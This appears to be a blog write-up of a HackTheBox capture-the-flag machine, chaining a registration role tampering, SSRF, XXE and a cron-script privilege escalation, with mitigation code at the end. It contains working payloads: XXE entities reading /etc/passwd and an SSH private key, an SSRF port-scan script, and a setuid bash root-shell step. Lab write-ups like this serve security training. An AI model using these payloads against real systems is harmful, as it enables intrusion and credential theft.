---
layout: post
title: "HackTheBox Academy CTF Writeup - Advanced Web Exploitation"
date: 2024-02-10 14:30:00 -0000
categories: [CTF, Writeup]
tags: [HackTheBox, CTF, Web Exploitation, SSRF, XXE]
author: Your Name
---

This writeup covers the "Academy" machine from HackTheBox, which features multiple web vulnerabilities including SSRF, XXE, and privilege escalation. This is a great machine for practicing modern web exploitation techniques.

## Machine Information

- **Name**: Academy
- **Difficulty**: Medium
- **Operating System**: Linux
- **Skills Required**: Web enumeration, SSRF, XXE, Linux privilege escalation
- **Skills Learned**: Advanced web exploitation, API security testing

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA academy 10.10.10.215

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41
```

Only two ports open - SSH and HTTP. Let's focus on the web application.

### Web Enumeration

```bash
# Directory enumeration
gobuster dir -u http://10.10.10.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/admin      (Status: 302)
/api        (Status: 301)
/register   (Status: 200)
/login      (Status: 200)
```

Interesting! We have an admin panel and an API endpoint.

## Initial Access

### Registration Vulnerability

Examining the registration form, I noticed it sends:

```http
POST /register HTTP/1.1
Host: 10.10.10.215
Content-Type: application/x-www-form-urlencoded

username=test&email=test@test.com&password=test123&roleid=0
```

The `roleid` parameter caught my attention. Let's try modifying it:

```http
POST /register HTTP/1.1

username=admin2&email=admin2@test.com&password=admin123&roleid=1
```

Success! We can now login with admin privileges.

### Admin Panel Discovery

After logging in as admin, we discovered a new functionality - a "Configuration Tester" that accepts URLs:

```
http://academy.htb/admin/config-test
```

This looks like a potential SSRF vulnerability!

## SSRF Exploitation

### Testing SSRF

```bash
# Start a listener
nc -lvnp 8000

# Submit in config tester
http://10.10.14.15:8000/test
```

We receive a connection! The application is vulnerable to SSRF.

### Internal Port Scanning

```python
import requests

target = "http://10.10.10.215/admin/config-test"
session = requests.Session()

# Login first
login_data = {
    "username": "admin2",
    "password": "admin123"
}
session.post("http://10.10.10.215/login", data=login_data)

# Scan internal ports
for port in range(1, 10000):
    payload = {
        "url": f"http://127.0.0.1:{port}"
    }

    r = session.post(target, data=payload)

    if "Connection refused" not in r.text:
        print(f"[+] Port {port} is open!")
```

Discovered internal services:
- Port 3000: Internal API
- Port 8080: Development server
- Port 9000: Unknown service

### Accessing Internal API

```bash
# Request through SSRF
http://127.0.0.1:3000/api/users

# Response reveals user data including hashed passwords
```

## XXE Vulnerability

The internal API at port 3000 accepts XML input:

```xml
POST /api/users HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/xml

<?xml version="1.0"?>
<user>
    <username>test</username>
</user>
```

Testing for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <username>&xxe;</username>
</user>
```

Success! We can read local files.

### Combining SSRF + XXE

```python
import requests
import urllib.parse

# XXE payload to read files
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///home/admin/.ssh/id_rsa">
]>
<user>
    <username>&xxe;</username>
</user>'''

# Send via SSRF
ssrf_url = f"http://127.0.0.1:3000/api/users"
config_test = {
    "url": ssrf_url,
    "method": "POST",
    "body": xxe_payload
}

response = session.post("http://10.10.10.215/admin/config-test", data=config_test)
```

Retrieved SSH private key!

## User Access

```bash
# Save the private key
chmod 600 id_rsa

# SSH as admin user
ssh -i id_rsa admin@10.10.10.215

# Get user flag
cat /home/admin/user.txt
```

**User Flag**: `f3a7************************8e2c`

## Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l
# Nothing interesting

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check running processes
ps aux | grep root

# Found: /opt/backup_script.sh running as root
```

### Analyzing backup_script.sh

```bash
cat /opt/backup_script.sh
```

```bash
#!/bin/bash

# Backup configuration files
tar -czf /tmp/backup_$(date +%s).tar.gz /var/www/html/config/*

# Run custom backup tasks
if [ -f /var/www/html/config/backup_tasks.sh ]; then
    bash /var/www/html/config/backup_tasks.sh
fi

# Cleanup old backups
find /tmp -name "backup_*.tar.gz" -mtime +7 -delete
```

The script executes `/var/www/html/config/backup_tasks.sh` if it exists!

### Checking Permissions

```bash
ls -la /var/www/html/config/
drwxrwxr-x 2 root www-data 4096 Feb 10 12:00 .
```

We're in the `www-data` group and can write to this directory!

### Exploitation

```bash
# Create malicious backup_tasks.sh
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /var/www/html/config/backup_tasks.sh

chmod +x /var/www/html/config/backup_tasks.sh

# Wait for cron job (runs every 5 minutes)
watch -n 1 'ls -la /tmp/rootbash'

# Once created, execute
/tmp/rootbash -p

# Root shell!
cat /root/root.txt
```

**Root Flag**: `a9e1************************7b3f`

## Key Takeaways

### Vulnerabilities Found

1. **Insecure Direct Object Reference (IDOR)**: Registration roleid parameter
2. **Server-Side Request Forgery (SSRF)**: Config tester functionality
3. **XML External Entity (XXE)**: Internal API XML parsing
4. **Privilege Escalation**: Writable directory in root cron script

### Mitigation Strategies

#### For SSRF
```python
# Whitelist allowed domains
ALLOWED_DOMAINS = ['api.company.com', 'internal.company.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_DOMAINS

# Block internal IP ranges
BLOCKED_RANGES = [
    '127.0.0.0/8',
    '10.0.0.0/8',
    '172.16.0.0/12',
    '192.168.0.0/16'
]
```

#### For XXE
```python
from lxml import etree

# Disable DTD processing
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False
)

doc = etree.fromstring(xml_data, parser)
```

#### For Privilege Escalation
```bash
# Proper file permissions
chmod 755 /var/www/html/config
chown root:root /var/www/html/config

# Use absolute paths in scripts
/usr/bin/bash /root/scripts/backup_tasks.sh

# Validate script integrity
sha256sum -c /root/scripts/backup_tasks.sh.sha256
```

## Tools Used

- **Nmap**: Port scanning
- **Gobuster**: Directory enumeration
- **Burp Suite**: Request manipulation
- **Python**: Custom exploitation scripts
- **LinEnum**: Linux enumeration

## Timeline

- **00:00 - 00:15**: Nmap scan and web enumeration
- **00:15 - 00:45**: Discovered and exploited registration vulnerability
- **00:45 - 01:30**: SSRF discovery and internal port scanning
- **01:30 - 02:00**: XXE exploitation and SSH key retrieval
- **02:00 - 02:15**: User flag obtained
- **02:15 - 02:45**: Privilege escalation enumeration
- **02:45 - 03:00**: Root flag obtained

**Total Time**: 3 hours

## Conclusion

Academy was an excellent machine for practicing modern web exploitation techniques. The combination of SSRF and XXE vulnerabilities was particularly interesting, demonstrating how multiple vulnerabilities can be chained together for maximum impact.

The privilege escalation was straightforward but highlighted the importance of proper file permissions and secure scripting practices.

## References

- [OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [GTFOBins - Privilege Escalation](https://gtfobins.github.io/)

---

*Thanks for reading! If you enjoyed this writeup, check out my other [CTF solutions](/blog) and [security projects](/projects).*
